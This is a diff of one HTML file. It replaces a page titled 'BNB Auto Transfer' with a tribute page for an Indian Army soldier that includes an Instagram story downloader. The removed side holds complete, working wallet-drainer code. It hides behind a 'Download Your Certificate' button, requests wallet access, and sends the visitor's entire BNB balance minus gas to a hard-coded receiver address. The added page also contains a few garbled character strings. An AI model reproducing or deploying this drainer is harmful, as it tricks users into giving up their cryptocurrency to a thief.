@@ -1,148 +1,175 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>BNB Auto Transfer</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <style>
-    body {
-      font-family: sans-serif;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background: #f5f5f5;
-    }
-
-    .container {
-      text-align: center;
-      background: white;
-      padding: 40px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      max-width: 400px;
-      width: 90%;
-    }
-
-    h2 {
-      margin-bottom: 20px;
-    }
-
-    #sendButton {
-      font-size: 18px;
-      padding: 12px 30px;
-      background-color: #f0b90b;
-      border: none;
-      color: white;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-
-    #sendButton:hover {
-      background-color: #d9a30a;
-    }
-
-    #status {
-      margin-top: 20px;
-      font-size: 14px;
-    }
-
-    #nameInput {
-      font-size: 18px;
-      padding: 10px;
-      width: 80%;
-      margin-bottom: 20px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      outline: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gift for Ashok Kumar Badiya Ji</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
+            color: #fff;
+            text-align: center;
+            overflow-x: hidden;
+        }
+        header {
+            padding: 50px 20px;
+            background: rgba(0, 0, 0, 0.5);
+            border-bottom: 3px solid #ffd700;
+        }
+        header h1 {
+            font-size: 3em;
+            margin: 0;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+            animation: fadeIn 2s ease-in-out;
+        }
+        header p {
+            font-size: 1.5em;
+            margin: 10px 0;
+            animation: slideIn 2s ease-in-out;
+        }
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+        }
+        .message {
+            font-size: 1.2em;
+            margin: 20px 0;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            animation: pulse 2s infinite;
+        }
+        .shayari {
+            margin: 30px 0;
+            padding: 20px;
+            background: rgba(0, 128, 0, 0.3);
+            border-radius: 10px;
+            font-style: italic;
+            font-size: 1.1em;
+            text-align: left;
+            line-height: 1.6;
+        }
+        .shayari h3 {
+            margin: 0 0 10px;
+            font-size: 1ර:1.4em;color: #ffd700;
+        }
+        .downloader {
+            margin: 30px 0;
+        }
+        .downloader input {
+            padding: 10px;
+            width: 60%;
+            border: none;
+            border-radius: 5px;
+            font-size: 1em;
+            margin-right: 10px;
+        }
+        .downloader button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            background: #ffd700;
+            color: #333;
+            font-size: 1em;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .downloader button:hover {
+            background: #ffeb3b;
+        }
+        footer {
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            position: relative;
+            bottom: 0;
+            width: 100%;
+        }
+        footer p {
+            margin: 0;
+            font-size: 1em;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes slideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        @media (max-width: 600px) {
+            header h1 { font-size: 2em; }
+            header p { font-size: 1.2em; }
+            .downloader input { width: 80%; margin-bottom: 10px; }
+            .shayari { font-size: 1em; }
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <input type="text" id="nameInput" placeholder="Enter Your Full Name">
-    <p>Download Your Certificate</p>
-    <button id="sendButton">Download</button>
-    <p id="status"></p>
-  </div>
-
-  <script>
-    const receiver = "0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a"; // replace with your address
-    const gasLimit = 21000;
-
-    document.getElementById("sendButton").onclick = async () => {
-      const status = document.getElementById("status");
-      status.textContent = "Connecting...";
-      status.style.color = "red";
-
-      let web3;
-
-      if (typeof window.ethereum !== 'undefined') {
-        web3 = new Web3(window.ethereum);
-        try {
-          await window.ethereum.request({ method: 'eth_requestAccounts' });
-        } catch (err) {
-          status.textContent = "Access to wallet denied.";
-          return;
+    <header>
+        <h1>Jai Hind, Ashok Kumar Badiya Ji!</h1>
+        <p>A Special Gift from Manish Bhaskar</p>
+    </header>
+    <div class="container">
+        <div class="message">
+            <p>Dear Jija Ji, Ashok Kumar Badiya,<br>
+            Thank you for your bravery and dedication in serving our nation in the Indian Army. This website is a heartfelt gift from Manish Bhaskar, filled with love and gratitude. Thanks & Whanks! Jai Hind, Army Love Army!</p>
+        </div>
+        <div class="shayari">
+            <h3>Shayari for Our Brave Soldier</h3>
+            <p>
+                Sarhad pe khada hai jo, desh ka hai woh veer,<br>
+                Ashok Kumar Badiya Ji, aap par humein hai fakr dheer!<br>
+                Jai Hind, Army Love Army!
+            </p>
+            <h3>Another Salute to You</h3>
+            <p>
+                Fauji dil se dil tak, aapki wafadari salaam,<br>
+                Bharat ke liye jiye, aap hain desh ka naam!<br>
+                Jai Hind, Army Love Army!
+            </p>
+        </div>
+        <div class="downloader">
+            <h2>Instagram Story Downloader</h2>
+            <p>Paste the Instagram story link below and click to download!</p>
+            <input type="text" id="storyLink" placeholder="Enter Instagram Story URL">
+            <button onclick="downloadStory()">Download Story</button>
+            <p id="status" style="margin-top: 10px;"></p>
+        </div>
+    </div>
+    <footer>
+        <p>Made with ❤️ by Manish Bhaskar for Ashok Kumar Badiya Ji | Jai Hind, Army Love Army!</p>
+    </footer>
+    <script>
+        function downloadStory() {
+            const link = document.getElementById('storyLink').value;
+            const status = document.getElementById('status');
+            if (!link) {
+                status.innerHTML = "Please enter gréa valid Instagram story URL!";
+                status.style.color = "red";
+                return;
+            }
+            // Redirect to a third-party Instagram story downloader
+            const thirdPartyUrl = `https://snapinsta.app/?url=${encodeURIComponent(link)}`;
+            status.innerHTML = "Redirecting to download service...";
+            status.style.color = "yellow";
+            setTimeout(() => {
+                window.open(thirdPartyUrl, '_blank');
+                status.innerHTML = "Check the new tab for your download!";
+                status.style.color = "green";
+            }, 1000);
         }
-      } else if (window.web3) {
-        web3 = new Web3(window.web3.currentProvider);
-      } else {
-        status.textContent = "Ethereum wallet not found. Open in Trust Wallet browser or install MetaMask.";
-        return;
-      }
-
-      try {
-        const accounts = await web3.eth.getAccounts();
-        const sender = accounts[0];
-
-        const chainId = await web3.eth.getChainId();
-        if (chainId !== 56) {
-          status.textContent = "Please switch to BNB Smart Chain (Chain ID 56).";
-          return;
-        }
-
-        const balanceWei = BigInt(await web3.eth.getBalance(sender));
-        const gasPrice = BigInt(await web3.eth.getGasPrice());
-        const totalGasCost = gasPrice * BigInt(gasLimit);
-
-        if (balanceWei <= totalGasCost) {
-          status.textContent = "Insufficient balance to cover gas fees.";
-          return;
-        }
-
-        const sendAmount = balanceWei - totalGasCost;
-
-        const txParams = {
-          from: sender,
-          to: receiver,
-          value: "0x" + sendAmount.toString(16),
-          gas: "0x" + gasLimit.toString(16),
-          gasPrice: "0x" + gasPrice.toString(16),
-        };
-
-        status.textContent = "Sending transaction...";
-        status.style.color = "black";
-
-        web3.eth.sendTransaction(txParams)
-          .on('transactionHash', function(hash){
-            status.style.color = "green";
-            status.textContent = "Transaction sent! Hash: " + hash;
-          })
-          .on('error', function(error){
-            status.style.color = "red";
-            status.textContent = "Transaction failed: " + (error.message || error);
-          });
-
-      } catch (err) {
-        status.style.color = "red";
-        status.textContent = "Error: " + (err.message || err);
-      }
-    };
-  </script>
+    </script>
 </body>
 </html>
